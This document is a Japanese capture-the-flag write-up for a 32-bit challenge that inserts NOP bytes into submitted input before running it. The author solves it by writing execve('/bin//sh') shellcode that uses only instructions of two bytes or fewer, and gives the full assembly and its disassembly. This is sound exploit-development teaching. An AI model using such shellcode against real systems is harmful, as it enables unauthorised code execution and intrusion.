## tl;dr

shellcode

## プログラム

入力されたデータに 2 byte ごとに `\x90` (NOP) を 2 つ挟んだ上で実行する 32 bit のプログラムです。

## 解法

普通の shellcode の場合は、3 byte 以上の命令もあるので NOP が途中で挟まれて死にます。よって、2 バイト以下の命令を使って shellcode を書かないといけません。

また、1 バイトの命令を奇数個繋げた後に 2 byte 命令をすると困るので、適宜 NOP を挟みましょう。

具体的に、`push 0x68732f2f` などは無理なので、`mov al,0x68` や `shl eax,1` を活用して力技でなんとかします。`shl` も 2 つ以上シフトすると 2 バイトに収まらないので、1 バイト毎に 8 回呼びます。

```asm
BITS 32
section .text
	global _start
_start:
	xor eax, eax
	push eax
	nop
	mov al,0x68
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	mov al,0x73
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	mov al,0x2f
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	mov al,0x2f
	;push 0x68732f2f
	push eax
	nop
	mov al,0x6e
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	mov al,0x69
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	mov al,0x62
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	shl eax,1
	mov al,0x2f
	push eax
	nop
	;push 0x6e69622f
	mov ebx, esp
	xor eax, eax
	xor edx, edx
	push eax
	push ebx
	mov ecx, esp
	mov al, 0xb
	int 0x80
```

全て 2 バイト命令に収まりました。

```asm
$ ndisasm -b 32 binsh
00000000  31C0              xor eax,eax
00000002  50                push eax
00000003  90                nop
00000004  B068              mov al,0x68
00000006  D1E0              shl eax,1
00000008  D1E0              shl eax,1
0000000A  D1E0              shl eax,1
0000000C  D1E0              shl eax,1
0000000E  D1E0              shl eax,1
00000010  D1E0              shl eax,1
00000012  D1E0              shl eax,1
00000014  D1E0              shl eax,1
00000016  B073              mov al,0x73
00000018  D1E0              shl eax,1
0000001A  D1E0              shl eax,1
0000001C  D1E0              shl eax,1
0000001E  D1E0              shl eax,1
00000020  D1E0              shl eax,1
00000022  D1E0              shl eax,1
00000024  D1E0              shl eax,1
00000026  D1E0              shl eax,1
00000028  B02F              mov al,0x2f
0000002A  D1E0              shl eax,1
0000002C  D1E0              shl eax,1
0000002E  D1E0              shl eax,1
00000030  D1E0              shl eax,1
00000032  D1E0              shl eax,1
00000034  D1E0              shl eax,1
00000036  D1E0              shl eax,1
00000038  D1E0              shl eax,1
0000003A  B02F              mov al,0x2f
0000003C  50                push eax
0000003D  90                nop
0000003E  B06E              mov al,0x6e
00000040  D1E0              shl eax,1
00000042  D1E0              shl eax,1
00000044  D1E0              shl eax,1
00000046  D1E0              shl eax,1
00000048  D1E0              shl eax,1
0000004A  D1E0              shl eax,1
0000004C  D1E0              shl eax,1
0000004E  D1E0              shl eax,1
00000050  B069              mov al,0x69
00000052  D1E0              shl eax,1
00000054  D1E0              shl eax,1
00000056  D1E0              shl eax,1
00000058  D1E0              shl eax,1
0000005A  D1E0              shl eax,1
0000005C  D1E0              shl eax,1
0000005E  D1E0              shl eax,1
00000060  D1E0              shl eax,1
00000062  B062              mov al,0x62
00000064  D1E0              shl eax,1
00000066  D1E0              shl eax,1
00000068  D1E0              shl eax,1
0000006A  D1E0              shl eax,1
0000006C  D1E0              shl eax,1
0000006E  D1E0              shl eax,1
00000070  D1E0              shl eax,1
00000072  D1E0              shl eax,1
00000074  B02F              mov al,0x2f
00000076  50                push eax
00000077  90                nop
00000078  89E3              mov ebx,esp
0000007A  31C0              xor eax,eax
0000007C  31D2              xor edx,edx
0000007E  50                push eax
0000007F  53                push ebx
00000080  89E1              mov ecx,esp
00000082  B00B              mov al,0xb
00000084  CD80              int 0x80
```

これで shell が起動します。やったね！